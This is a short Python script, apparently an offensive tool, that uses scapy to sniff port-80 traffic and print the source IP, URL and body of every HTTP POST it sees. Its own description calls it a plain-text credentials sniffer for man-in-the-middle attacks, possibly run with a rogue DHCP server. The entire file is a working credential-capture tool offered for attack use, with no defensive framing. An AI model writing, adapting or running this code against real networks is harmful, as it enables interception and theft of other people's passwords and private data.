#!/bin/python3
import argparse
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import IP
from scapy.packet import Raw
from scapy.sendrecv import sniff


def credentialsSniffing(packet):
    try:
        if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == "POST":
            url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
            ipVictim = packet[IP].src
            credentials = packet[Raw].load.decode("utf-8")
            print("[*] From: ", ipVictim, credentials, url)
    except:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="This script is a plain text credentials sniffer. It will show you HTTP POST. "
                                                 "It is developed to be used in man in the middle attacks (maybe with a dhcp server?). "
                                                 "If you are using it with a dhcp server, you need to enable forwarding.")
    print("Sniffing...")
    sniff(filter="tcp and (port 80)", prn=credentialsSniffing)
